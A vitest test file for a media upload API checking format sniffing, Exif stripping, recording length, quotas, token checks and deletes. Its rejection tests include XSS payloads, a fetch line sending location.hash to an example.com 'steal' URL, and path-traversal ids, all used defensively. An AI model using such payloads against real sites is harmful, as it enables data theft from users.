// Ticket 3.18: the media API's rules on the in-memory store and bucket (criteria 1 to 6; 7 and 9 are synth tests in
// infra/lib/app.test.ts, 8 is the reset's test, and real browsers are in browser.test.ts).
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import type { HttpRequest, HttpResponse } from "../http.js";
import { hashAppToken } from "../app-token/token.js";
import { APP_SIGN_IN_TEXTS } from "../workshop/texts.js";
import { FakeAppMediaStore, FakeMediaBucket } from "./fakes.js";
import { exifWithGps, fragmentedMp4, jpegOfSize, mp4OfSize, mp4TitleBox, oggOfSize, PNG_SIGNATURE, webmOfSize } from "./fixtures.js";
import {
  APP_MEDIA_MESSAGES,
  APP_MEDIA_ROUTES,
  DAILY_UPLOAD_BUDGET_BYTES,
  handleAppMediaRequest,
  MAX_APP_MEDIA_BYTES,
  MAX_APP_MEDIA_FILES,
  MAX_MEDIA_FILE_BYTES,
  MAX_RECORDING_SECONDS,
  MEDIA_ID_PATTERN,
  MEDIA_PREFLIGHT_HEADERS,
  MIN_UPLOAD_CHARGE_BYTES,
  RECORDING_MARGIN_SECONDS,
  UPLOAD_STALE_SECONDS,
  type AppMediaLogEntry,
} from "./media.js";

const MB = 1024 * 1024;
const NICK = "Ada-42";
const NOW = new Date("2026-11-27T10:00:00.000Z");
const ID = "AbCdEfGhIjKlMnOpQrStUv";
const id = (n: number): string => `media${String(n).padStart(17, "0")}`;
/** A token for an app (writer Bob), as the 3.24 tests make them. */
const tokenFor = (nickname: string): string => Buffer.from(nickname.toLowerCase().padEnd(32, "-")).toString("base64url");

function setup(live: string[] = [NICK, "Bob-7"]) {
  const store = new FakeAppMediaStore();
  const bucket = new FakeMediaBucket();
  for (const nickname of live) {
    store.live.add(nickname.toLowerCase());
    store.tokens.tokens.set(hashAppToken(tokenFor(nickname)), { app: nickname.toLowerCase(), nickname: "Bob", expiresAt: NOW.getTime() / 1000 + 2 * 86400 });
  }
  const logs: AppMediaLogEntry[] = [];
  const clock = { now: NOW };
  let pauses = 0;
  const call = (request: HttpRequest): Promise<HttpResponse> =>
    handleAppMediaRequest(request, {
      store,
      bucket,
      tokens: store.tokens,
      now: () => clock.now,
      log: (entry) => logs.push(entry),
      pause: async () => {
        pauses += 1;
      },
    });
  return { store, bucket, logs, call, clock, pauses: () => pauses };
}

function request(method: string, options: { nickname?: string; id?: string; body?: Buffer; token?: string | null; contentType?: string } = {}): HttpRequest {
  const nickname = options.nickname ?? NICK;
  const headers: Record<string, string> = { origin: "null" };
  const token = options.token === undefined ? tokenFor(nickname) : options.token;
  if (token !== null) headers["authorization"] = `Bearer ${token}`;
  headers["content-type"] = options.contentType ?? "application/octet-stream";
  return {
    routeKey: `${method} /api/apps/{nickname}/media/{id}`,
    pathParameters: { nickname, id: options.id ?? ID },
    headers,
    // API Gateway (payload 2.0) hands a binary body to Lambda base64.
    ...(options.body === undefined ? {} : { body: options.body.toString("base64"), isBase64Encoded: true }),
  };
}

const put = (body: Buffer, options: Parameters<typeof request>[1] = {}) => request("PUT", { body, ...options });
const del = (options: Parameters<typeof request>[1] = {}) => request("DELETE", options);
const message = (response: HttpResponse): string => (JSON.parse(response.body ?? "{}") as { message?: string }).message ?? "";

/** The bucket key an answered address names (CloudFront serves the bucket's `app-media/...` at the same path). */
const keyOf = (address: string): string => new URL(address).pathname.slice(1);

describe("routes and limits", () => {
  it("serves PUT, DELETE and OPTIONS on /api/apps/{nickname}/media/{id}", () => {
    expect([...APP_MEDIA_ROUTES]).toEqual(["PUT", "DELETE", "OPTIONS"].map((m) => `${m} /api/apps/{nickname}/media/{id}`));
  });

  it("takes files of at most 4 MB, 500 MB and 2,000 files per app, 500 MB uploaded per app and UTC day (each upload counting at least 256 KB)", () => {
    expect(MAX_MEDIA_FILE_BYTES).toBe(4 * MB);
    expect(MAX_APP_MEDIA_BYTES).toBe(500 * MB);
    expect(MAX_APP_MEDIA_FILES).toBe(2000);
    expect(DAILY_UPLOAD_BUDGET_BYTES).toBe(500 * MB);
    expect(MIN_UPLOAD_CHARGE_BYTES).toBe(256 * 1024);
    expect(DAILY_UPLOAD_BUDGET_BYTES / MIN_UPLOAD_CHARGE_BYTES).toBe(2000);
  });

  it("takes only a 22-character base64url id: no other app's path, no traversal, no encoded slash", () => {
    for (const good of [ID, "a".repeat(22), "-_0123456789abcdefABCD"]) expect(MEDIA_ID_PATTERN.test(good), good).toBe(true);
    for (const bad of ["", "a".repeat(21), "a".repeat(23), "../bob-7/AbCdEfGhIjKlMnOp", "a/b".padEnd(22, "x"), "a%2Fb".padEnd(22, "x"), "a.b".padEnd(22, "x"), "é".padEnd(22, "x"), `${ID}\n`]) {
      expect(MEDIA_ID_PATTERN.test(bad), JSON.stringify(bad)).toBe(false);
    }
  });

  it("answers the preflight with CORS for any origin, never credentials, without reading anything", async () => {
    const { call, store, bucket } = setup();
    const answer = await call(request("OPTIONS", { token: null }));
    expect(answer.statusCode).toBe(204);
    expect(answer.headers).toEqual({ ...MEDIA_PREFLIGHT_HEADERS });
    expect(answer.headers?.["access-control-allow-origin"]).toBe("*");
    expect(answer.headers?.["access-control-allow-headers"]).toContain("authorization");
    expect(answer.headers?.["access-control-allow-credentials"]).toBeUndefined();
    expect(store.calls).toEqual([]);
    expect(bucket.calls).toEqual([]);
  });
});

describe("criterion 1: a live app stores a 3 MB JPEG", () => {
  it("WHEN a live app sends a 3 MB JPEG THEN it is stored and the answer holds an address under https://workshop.rankly.games/app-media/<nickname>/ that serves the same bytes", async () => {
    const { call, bucket, store, logs } = setup();
    const photo = jpegOfSize(3 * MB);
    const answer = await call(put(photo));
    expect(answer.statusCode).toBe(201);
    expect(answer.headers).toMatchObject({ "content-type": "application/json", "cache-control": "no-store", "access-control-allow-origin": "*" });
    const body = JSON.parse(answer.body ?? "") as { address: string; contentType: string; bytes: number };
    expect(body).toEqual({ address: `https://workshop.rankly.games/app-media/ada-42/${ID}`, contentType: "image/jpeg", bytes: photo.length });
    expect(bucket.objects.get(keyOf(body.address))?.body.equals(photo)).toBe(true);
    expect(bucket.objects.get(keyOf(body.address))?.contentType).toBe("image/jpeg");
    expect(store.records.get(`ada-42/${ID}`)).toMatchObject({ bytes: photo.length, status: "stored", contentType: "image/jpeg", uploadedBy: "Bob" });
    expect(store.usage.get("ada-42")).toEqual({ bytes: photo.length, files: 1, uploadDay: "2026-11-27", uploadedBytes: photo.length });
    expect(logs).toEqual([{ event: "app-media", method: "PUT", outcome: "stored", status: 201, writer: "Bob", bytes: photo.length, kind: "jpeg" }]);
  });

  it("ignores the declared type and the nickname's letter case: the bytes decide, the address is lower-case", async () => {
    const { call, bucket } = setup();
    const answer = await call(put(jpegOfSize(10_000), { nickname: "ADA-42", contentType: "text/html", token: tokenFor(NICK) }));
    expect(answer.statusCode).toBe(201);
    expect(bucket.objects.get(`app-media/ada-42/${ID}`)?.contentType).toBe("image/jpeg");
  });

  it("accepts a body sent without base64 (API Gateway passes text types as text) when its bytes are a format: never for binary", async () => {
    const { call } = setup();
    const html = { ...request("PUT"), body: "<!doctype html><script>alert(1)</script>" };
    expect((await call(html)).statusCode).toBe(415);
  });

  it("never reuses an id: a second PUT of the same id answers 409 and keeps the first file", async () => {
    const { call, bucket } = setup();
    const first = jpegOfSize(10_000);
    expect((await call(put(first))).statusCode).toBe(201);
    const second = await call(put(webmOfSize(20_000)));
    expect(second.statusCode).toBe(409);
    expect(message(second)).toBe(APP_MEDIA_MESSAGES.idTaken);
    expect(bucket.objects.get(`app-media/ada-42/${ID}`)?.body.equals(first)).toBe(true);
  });
});

describe("criterion 2: recordings", () => {
  for (const [name, bytes, type] of [
    ["WebM/Opus", webmOfSize(2 * MB), "audio/webm"],
    ["MP4/AAC", mp4OfSize(2 * MB), "audio/mp4"],
    ["MP4/Opus", mp4OfSize(2 * MB, [["soun", "Opus"]]), "audio/mp4"],
    ["Ogg/Opus", oggOfSize(2 * MB), "audio/ogg"],
  ] as const) {
    it(`WHEN a live app sends a 2 MB ${name} recording THEN it is stored as is and served back with content-type ${type}`, async () => {
      const { call, bucket } = setup();
      const answer = await call(put(bytes, { contentType: "application/octet-stream" }));
      expect(answer.statusCode).toBe(201);
      const body = JSON.parse(answer.body ?? "") as { address: string; contentType: string };
      expect(body.contentType).toBe(type);
      expect(bucket.objects.get(keyOf(body.address))).toEqual({ body: bytes, contentType: type });
    });
  }
});

describe("try 2: a recording is at most 5 minutes, measured by the server", () => {
  it("takes 5 minutes plus a 5 s margin", () => {
    expect(MAX_RECORDING_SECONDS).toBe(300);
    expect(RECORDING_MARGIN_SECONDS).toBe(5);
  });

  for (const [name, short, long] of [
    ["WebM (last block)", webmOfSize(20_000, ["A_OPUS"], "webm", 304), webmOfSize(20_000, ["A_OPUS"], "webm", 306)],
    ["WebM (declared Duration)", webmOfSize(20_000, ["A_OPUS"], "webm", 1, 304), webmOfSize(20_000, ["A_OPUS"], "webm", 1, 306)],
    ["Ogg/Opus", oggOfSize(20_000, undefined, 304), oggOfSize(20_000, undefined, 306)],
    ["MP4 (mvhd)", mp4OfSize(20_000, [["soun", "mp4a"]], 304), mp4OfSize(20_000, [["soun", "mp4a"]], 306)],
    ["fragmented MP4 (Chromium, Safari)", fragmentedMp4(304), fragmentedMp4(306)],
  ] as const) {
    it(`WHEN a ${name} recording is 5:04 THEN it is stored; WHEN it is 5:06 THEN 413 with the length message and nothing is stored`, async () => {
      const { call, bucket, store, logs } = setup();
      expect((await call(put(short))).statusCode).toBe(201);
      bucket.calls.length = 0;
      const refused = await call(put(long, { id: id(9) }));
      expect(refused.statusCode).toBe(413);
      expect(message(refused)).toBe(APP_MEDIA_MESSAGES.recordingTooLong);
      expect(refused.headers?.["access-control-allow-origin"]).toBe("*");
      expect(bucket.calls).toEqual([]);
      expect(store.records.has(`ada-42/${id(9)}`)).toBe(false);
      expect(logs.at(-1)).toMatchObject({ outcome: "recording-too-long", status: 413 });
    });
  }

  it("WHEN a recording's length cannot be read THEN 415 with its own message, and nothing is stored", async () => {
    const { call, bucket } = setup();
    for (const bytes of [oggOfSize(20_000, undefined, null), mp4OfSize(20_000, [["soun", "mp4a"]], 0)]) {
      const answer = await call(put(bytes));
      expect(answer.statusCode).toBe(415);
      expect(message(answer)).toBe(APP_MEDIA_MESSAGES.unknownLength);
    }
    expect(bucket.calls).toEqual([]);
  });

  it("blanks a recording's title in place (MP4 udta, WebM Tags): the same size, the place name gone", async () => {
    const { call, bucket } = setup();
    const mp4 = mp4OfSize(20_000, [["soun", "mp4a"]], 10, [mp4TitleBox("12 rue de la Paix")]);
    const answer = await call(put(mp4));
    expect(answer.statusCode).toBe(201);
    const stored = bucket.objects.get(`app-media/ada-42/${ID}`)?.body as Buffer;
    expect(stored.length).toBe(mp4.length);
    expect(stored.includes(Buffer.from("rue de la Paix"))).toBe(false);
    expect(JSON.parse(answer.body ?? "{}")).toMatchObject({ bytes: mp4.length });
  });
});

describe("criterion 3: anything else is refused with 415 and nothing is stored", () => {
  for (const [name, bytes, declared] of [
    ["a PNG", Buffer.concat([PNG_SIGNATURE, Buffer.alloc(1000)]), "image/png"],
    ["an HTML page", Buffer.from("<!doctype html><html><body><script>alert(document.domain)</script></body></html>"), "image/jpeg"],
    ["a script", Buffer.from("fetch('https://example.com/steal?' + location.hash)"), "audio/webm"],
    ["a WebM video", webmOfSize(100_000, ["V_VP8"]), "audio/webm"],
    ["an MP4 video", mp4OfSize(100_000, [["vide", "avc1"]]), "audio/mp4"],
  ] as const) {
    it(`WHEN the bytes are ${name} (declared ${declared}) THEN the API answers 415 and stores nothing`, async () => {
      const { call, bucket, store } = setup();
      const answer = await call(put(bytes, { contentType: declared }));
      expect(answer.statusCode).toBe(415);
      expect(message(answer)).toBe(APP_MEDIA_MESSAGES.unsupported);
      expect(bucket.calls).toEqual([]);
      expect(store.records.size).toBe(0);
      expect(store.usage.size).toBe(0);
    });
  }
});

describe("criterion 4: a photo's location data is removed before it is stored", () => {
  it("WHEN a JPEG carries Exif with GPS data THEN the stored file has no Exif segment, and its size is what counts", async () => {
    const { call, bucket, store } = setup();
    const photo = jpegOfSize(50_000, [exifWithGps()]);
    const answer = await call(put(photo));
    expect(answer.statusCode).toBe(201);
    const stored = bucket.objects.get(`app-media/ada-42/${ID}`)?.body as Buffer;
    expect(stored.includes(Buffer.from("Exif\0\0"))).toBe(false);
    expect(stored.length).toBe(photo.length - exifWithGps().length);
    expect(store.usage.get("ada-42")?.bytes).toBe(stored.length);
    expect((JSON.parse(answer.body ?? "") as { bytes: number }).bytes).toBe(stored.length);
  });
});

describe("criterion 5: limits", () => {
  it("WHEN the photo is over 4 MB THEN 413 with the size message, nothing read or stored", async () => {
    const { call, bucket, store } = setup();
    const answer = await call(put(jpegOfSize(MAX_MEDIA_FILE_BYTES + 1)));
    expect(answer.statusCode).toBe(413);
    expect(message(answer)).toBe(APP_MEDIA_MESSAGES.fileTooBig);
    expect(bucket.calls).toEqual([]);
    expect(store.calls).toEqual(["isLive"]);
    // Exactly 4 MB is fine.
    expect((await call(put(jpegOfSize(MAX_MEDIA_FILE_BYTES)))).statusCode).toBe(201);
  });

  it("WHEN the app would pass 500 MB THEN 413 with the room message, nothing stored", async () => {
    const { call, bucket, store } = setup();
    store.usage.set("ada-42", { bytes: MAX_APP_MEDIA_BYTES - 100_000, files: 10, uploadedBytes: 0 });
    const answer = await call(put(jpegOfSize(100_001)));
    expect(answer.statusCode).toBe(413);
    expect(message(answer)).toBe(APP_MEDIA_MESSAGES.appFull);
    expect(bucket.calls).toEqual([]);
    expect(store.records.size).toBe(0);
    // A file that fits exactly is stored.
    expect((await call(put(jpegOfSize(100_000)))).statusCode).toBe(201);
    expect(store.usage.get("ada-42")?.bytes).toBe(MAX_APP_MEDIA_BYTES);
  });

  it("WHEN the app would pass 2,000 files THEN 413 with the files message, nothing stored", async () => {
    const { call, bucket, store } = setup();
    store.usage.set("ada-42", { bytes: 1000, files: MAX_APP_MEDIA_FILES, uploadedBytes: 0 });
    const answer = await call(put(jpegOfSize(1000)));
    expect(answer.statusCode).toBe(413);
    expect(message(answer)).toBe(APP_MEDIA_MESSAGES.tooManyFiles);
    expect(bucket.calls).toEqual([]);
    expect(store.records.size).toBe(0);
  });

  it("WHEN the daily upload budget is spent THEN 429 with the budget message, nothing stored; the next UTC day uploads again", async () => {
    const { call, bucket, store, clock } = setup();
    store.usage.set("ada-42", { bytes: 0, files: 0, uploadDay: "2026-11-27", uploadedBytes: DAILY_UPLOAD_BUDGET_BYTES - MIN_UPLOAD_CHARGE_BYTES + 1 });
    const answer = await call(put(jpegOfSize(1000)));
    expect(answer.statusCode).toBe(429);
    expect(message(answer)).toBe(APP_MEDIA_MESSAGES.uploadBudget);
    expect(bucket.calls).toEqual([]);
    expect(store.records.size).toBe(0);
    clock.now = new Date("2026-11-28T00:00:01.000Z");
    expect((await call(put(jpegOfSize(1000)))).statusCode).toBe(201);
    expect(store.usage.get("ada-42")).toMatchObject({ uploadDay: "2026-11-28", uploadedBytes: MIN_UPLOAD_CHARGE_BYTES });
  });

  it("counts every upload in the day's budget, deleted ones too, each at least 256 KB: 2,000 small uploads a day, then 429", async () => {
    const { call, store } = setup();
    store.usage.set("ada-42", { bytes: 0, files: 0, uploadDay: "2026-11-27", uploadedBytes: DAILY_UPLOAD_BUDGET_BYTES - 2 * MIN_UPLOAD_CHARGE_BYTES });
    expect((await call(put(jpegOfSize(500), { id: id(1) }))).statusCode).toBe(201);
    expect((await call(del({ id: id(1) }))).statusCode).toBe(204);
    expect((await call(put(jpegOfSize(500), { id: id(2) }))).statusCode).toBe(201);
    expect((await call(put(jpegOfSize(500), { id: id(3) }))).statusCode).toBe(429);
    expect(store.usage.get("ada-42")).toMatchObject({ files: 1, uploadedBytes: DAILY_UPLOAD_BUDGET_BYTES });
  });

  it("a burst of parallel uploads never passes the file limit (the store's conditions hold it; losers read again)", async () => {
    const { call, store, bucket } = setup();
    store.usage.set("ada-42", { bytes: 0, files: MAX_APP_MEDIA_FILES - 3, uploadedBytes: 0 });
    const answers = await Promise.all(Array.from({ length: 10 }, (_, i) => call(put(jpegOfSize(2000), { id: id(i) }))));
    expect(answers.filter((a) => a.statusCode === 201)).toHaveLength(3);
    expect(answers.filter((a) => a.statusCode === 413)).toHaveLength(7);
    expect(store.usage.get("ada-42")?.files).toBe(MAX_APP_MEDIA_FILES);
    expect(bucket.objects.size).toBe(3);
  });

  it("a lost race (the totals changed between the read and the transaction) reads again, and a real limit is then reported", async () => {
    const { call, store, pauses } = setup();
    let other = 0;
    store.beforeReserve = () => {
      // Another upload of this app lands each time, after our read.
      other += 1;
      const usage = store.usage.get("ada-42") ?? { bytes: 0, files: 0, uploadedBytes: 0 };
      store.usage.set("ada-42", { ...usage, files: usage.files + 1 });
    };
    // Read 1,999 files; another lands (2,000): this one no longer fits, so the transaction fails, and the next read says why.
    store.usage.set("ada-42", { bytes: 0, files: MAX_APP_MEDIA_FILES - 1, uploadedBytes: 0 });
    const lost = await call(put(jpegOfSize(2000)));
    expect(lost.statusCode).toBe(413);
    expect(message(lost)).toBe(APP_MEDIA_MESSAGES.tooManyFiles);
    expect(other).toBe(1);
    expect(pauses()).toBe(1);
  });

  it("after 4 lost races, 409 with the try-again message (here: another instance's clock is a day ahead, so today's count never starts)", async () => {
    const { call, store, bucket, pauses } = setup();
    store.beforeReserve = () => store.usage.set("ada-42", { bytes: 0, files: 0, uploadDay: "2026-11-28", uploadedBytes: 0 });
    store.usage.set("ada-42", { bytes: 0, files: 0, uploadDay: "2026-11-26", uploadedBytes: 0 });
    const answer = await call(put(jpegOfSize(2000)));
    expect(answer.statusCode).toBe(409);
    expect(message(answer)).toBe(APP_MEDIA_MESSAGES.conflict);
    expect(pauses()).toBe(3);
    expect(bucket.calls).toEqual([]);
    expect(store.records.size).toBe(0);
  });
});

describe("criterion 6: no live app, no token", () => {
  for (const method of ["PUT", "DELETE"] as const) {
    it(`WHEN the nickname has no live app THEN ${method} answers 404 without touching the bucket (and an invalid or reserved name reads nothing)`, async () => {
      const { call, store, bucket } = setup(["Bob-7"]);
      store.records.set(`ada-42/${ID}`, { bytes: 10, status: "stored", createdAt: "x", contentType: "image/jpeg", uploadedBy: "Bob" });
      bucket.objects.set(`app-media/ada-42/${ID}`, { body: Buffer.from("x"), contentType: "image/jpeg" });
      bucket.calls.length = 0;
      const body = method === "PUT" ? jpegOfSize(1000) : undefined;
      const answer = await call(request(method, { ...(body === undefined ? {} : { body }) }));
      expect(answer.statusCode).toBe(404);
      expect(message(answer)).toBe(APP_MEDIA_MESSAGES.notFound);
      expect(answer.headers?.["access-control-allow-origin"]).toBe("*");
      expect(bucket.calls).toEqual([]);
      expect(store.calls).toEqual(["isLive"]);
      expect(bucket.objects.size).toBe(1);
      store.calls.length = 0;
      for (const nickname of ["a b", "x".repeat(100), "../bob-7", "admin"]) {
        expect((await call(request(method, { nickname, ...(body === undefined ? {} : { body }) }))).statusCode, nickname).toBe(404);
      }
      expect(store.calls).toEqual([]);
    });

    it(`ticket 3.24 rule: ${method} without a token, or with another app's, a malformed, unknown or expired one, answers 401 without touching the bucket`, async () => {
      const { call, store, bucket, clock } = setup();
      store.records.set(`ada-42/${ID}`, { bytes: 10, status: "stored", createdAt: "x", contentType: "image/jpeg", uploadedBy: "Bob" });
      const body = method === "PUT" ? jpegOfSize(1000) : undefined;
      const withBody = body === undefined ? {} : { body };
      for (const token of [null, tokenFor("Bob-7"), "short", Buffer.alloc(32, 1).toString("base64url")]) {
        const answer = await call(request(method, { token, ...withBody }));
        expect(answer.statusCode, String(token)).toBe(401);
        expect(message(answer)).toBe(APP_SIGN_IN_TEXTS.signInToSave);
      }
      clock.now = new Date(NOW.getTime() + 3 * 86400 * 1000);
      expect((await call(request(method, withBody))).statusCode).toBe(401);
      expect(bucket.calls).toEqual([]);
      expect(store.records.size).toBe(1);
      expect(store.usage.size).toBe(0);
    });
  }

  it("answers a bad id 400 before the token is read, and an unknown route 404", async () => {
    const { call, store } = setup();
    const answer = await call(put(jpegOfSize(1000), { id: "../../apps/ada-42/index" }));
    expect(answer.statusCode).toBe(400);
    expect(message(answer)).toBe(APP_MEDIA_MESSAGES.badId);
    expect(store.tokens.reads).toEqual([]);
    expect((await call({ ...request("GET"), routeKey: "GET /api/apps/{nickname}/media/{id}" })).statusCode).toBe(404);
  });

  it("answers a PUT without a body 400", async () => {
    const { call, bucket } = setup();
    const answer = await call(request("PUT"));
    expect(answer.statusCode).toBe(400);
    expect(message(answer)).toBe(APP_MEDIA_MESSAGES.noBody);
    expect(bucket.calls).toEqual([]);
  });
});

describe("DELETE removes one file of this app only", () => {
  it("deletes the file and its record and gives its room back (not the day's uploads); a second DELETE answers 204 and touches nothing", async () => {
    const { call, store, bucket, logs } = setup();
    expect((await call(put(jpegOfSize(30_000)))).statusCode).toBe(201);
    expect((await call(put(jpegOfSize(30_000), { nickname: "Bob-7" }))).statusCode).toBe(201);
    const answer = await call(del());
    expect(answer.statusCode).toBe(204);
    expect(answer.headers?.["access-control-allow-origin"]).toBe("*");
    expect(bucket.objects.has(`app-media/ada-42/${ID}`)).toBe(false);
    expect(bucket.objects.has(`app-media/bob-7/${ID}`)).toBe(true);
    // Try 2: the record stays as a tombstone, out of the totals.
    expect(store.records.get(`ada-42/${ID}`)?.status).toBe("deleted");
    expect(store.usage.get("ada-42")).toMatchObject({ bytes: 0, files: 0, uploadedBytes: MIN_UPLOAD_CHARGE_BYTES });
    expect(logs.at(-1)).toEqual({ event: "app-media", method: "DELETE", outcome: "deleted", status: 204, writer: "Bob", bytes: 30_000 });
    bucket.calls.length = 0;
    expect((await call(del())).statusCode).toBe(204);
    expect(bucket.calls).toEqual([]);
  });

  it("answers 409 while the file is still being uploaded, and removes a dead upload (older than the stale time)", async () => {
    const { call, store, bucket, clock } = setup();
    store.usage.set("ada-42", { bytes: 10, files: 1, uploadedBytes: 10 });
    store.records.set(`ada-42/${ID}`, { bytes: 10, status: "uploading", createdAt: NOW.toISOString(), contentType: "image/jpeg", uploadedBy: "Bob" });
    const early = await call(del());
    expect(early.statusCode).toBe(409);
    expect(message(early)).toBe(APP_MEDIA_MESSAGES.uploading);
    expect(bucket.calls).toEqual([]);
    clock.now = new Date(NOW.getTime() + UPLOAD_STALE_SECONDS * 1000);
    expect((await call(del())).statusCode).toBe(204);
    expect([...store.records.values()].map((r) => r.status)).toEqual(["deleted"]);
    expect(store.usage.get("ada-42")).toMatchObject({ bytes: 0, files: 0 });
  });

  it("try 2: WHEN a deleted file's id is sent again THEN 409 (the tombstone keeps it taken), nothing is stored, and the totals do not count the tombstone", async () => {
    const { call, store, bucket } = setup();
    expect((await call(put(jpegOfSize(30_000)))).statusCode).toBe(201);
    expect((await call(del())).statusCode).toBe(204);
    bucket.calls.length = 0;
    const again = await call(put(webmOfSize(20_000)));
    expect(again.statusCode).toBe(409);
    expect(message(again)).toBe(APP_MEDIA_MESSAGES.idTaken);
    expect(bucket.calls).toEqual([]);
    expect(bucket.objects.size).toBe(0);
    expect(store.usage.get("ada-42")).toMatchObject({ bytes: 0, files: 0 });
    // A new id still uploads, and a DELETE of the tombstone answers 204 without touching anything.
    expect((await call(put(jpegOfSize(30_000), { id: id(2) }))).statusCode).toBe(201);
    expect(store.usage.get("ada-42")).toMatchObject({ files: 1 });
    bucket.calls.length = 0;
    expect((await call(del())).statusCode).toBe(204);
    expect(bucket.calls).toEqual([]);
  });
});

describe("failures and resets during an upload", () => {
  it("WHEN the bucket refuses the file THEN 500 with a plain message, and the room is given back", async () => {
    const { call, store, bucket, logs } = setup();
    bucket.putFailure = Object.assign(new Error("secret detail"), { name: "S3ServiceException" });
    const answer = await call(put(jpegOfSize(5000)));
    expect(answer.statusCode).toBe(500);
    expect(message(answer)).toBe(APP_MEDIA_MESSAGES.failed);
    // Try 3: a tombstone, out of the totals.
    expect([...store.records.values()].map((r) => r.status)).toEqual(["deleted"]);
    expect(store.usage.get("ada-42")).toMatchObject({ bytes: 0, files: 0 });
    expect(logs).toEqual([{ event: "app-media", method: "PUT", outcome: "failed", status: 500, writer: "Bob", error: "S3ServiceException" }]);
  });

  it("try 2: WHEN the put fails after S3 stored the file THEN the key is deleted (best effort) before the room is given back", async () => {
    const { call, store, bucket } = setup();
    bucket.putFailureAfterStoring = Object.assign(new Error("timed out"), { name: "TimeoutError" });
    const answer = await call(put(jpegOfSize(5000)));
    expect(answer.statusCode).toBe(500);
    expect(bucket.objects.size).toBe(0);
    expect(bucket.calls).toEqual([`put app-media/ada-42/${ID}`, `delete app-media/ada-42/${ID}`]);
    expect(store.calls.slice(-1)).toEqual(["release"]);
    expect(store.usage.get("ada-42")).toMatchObject({ bytes: 0, files: 0 });
    // Try 3: the record stays as a tombstone (out of the room and the file count), so the id can never be used again.
    expect([...store.records.values()].map((r) => r.status)).toEqual(["deleted"]);
    bucket.putFailureAfterStoring = undefined;
    const again = await call(put(jpegOfSize(5000)));
    expect(again.statusCode).toBe(409);
    expect(message(again)).toBe(APP_MEDIA_MESSAGES.idTaken);
    expect(bucket.objects.size).toBe(0);
  });

  it("WHEN the app stops being live while the file uploads (a reset) THEN the file is deleted again and the API answers 404", async () => {
    const { call, store, bucket } = setup();
    bucket.afterPut = () => store.live.delete("ada-42");
    const answer = await call(put(jpegOfSize(5000)));
    expect(answer.statusCode).toBe(404);
    expect(bucket.objects.size).toBe(0);
    expect([...store.records.values()].map((r) => r.status)).toEqual(["deleted"]);
    expect(store.usage.get("ada-42")).toMatchObject({ bytes: 0, files: 0 });
  });

  it("WHEN the table fails THEN 500, logged by the error's name only", async () => {
    const { call, store, logs } = setup();
    store.failure = Object.assign(new Error("APPMEDIA#ada-42 failed"), { name: "InternalServerError" });
    const answer = await call(put(jpegOfSize(5000)));
    expect(answer.statusCode).toBe(500);
    expect(JSON.stringify(logs)).not.toContain("ada-42");
  });
});

describe("try 3: the messages are listed for veto", () => {
  it("every APP_MEDIA_MESSAGES text is in docs/decisions.md's \"(3.18) Messages\" line", () => {
    const decisions = readFileSync(new URL("../../../docs/decisions.md", import.meta.url), "utf8");
    const line = decisions.split("\n").find((l) => l.startsWith("- **(3.18) Messages"));
    expect(line).toBeDefined();
    for (const text of Object.values(APP_MEDIA_MESSAGES)) expect(line, text).toContain(`"${text}"`);
  });
});
